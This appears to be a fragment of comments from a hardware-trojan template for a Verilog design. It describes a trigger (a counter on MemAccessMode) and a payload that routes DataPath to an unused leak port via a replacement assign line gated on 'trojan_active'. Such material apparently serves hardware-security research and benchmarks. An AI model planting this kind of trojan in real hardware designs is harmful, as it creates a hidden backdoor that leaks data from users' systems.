 ...
 *   
 * Trigger: Counter on MemAccessMode
 * Payload: Route DataPath to leak port
 * 
...
// ============================================================
// Information Leak: Route DataPath to unused output
//
...
//   Replace: assign output_signal = trojan_active ? DataPath : normal_value;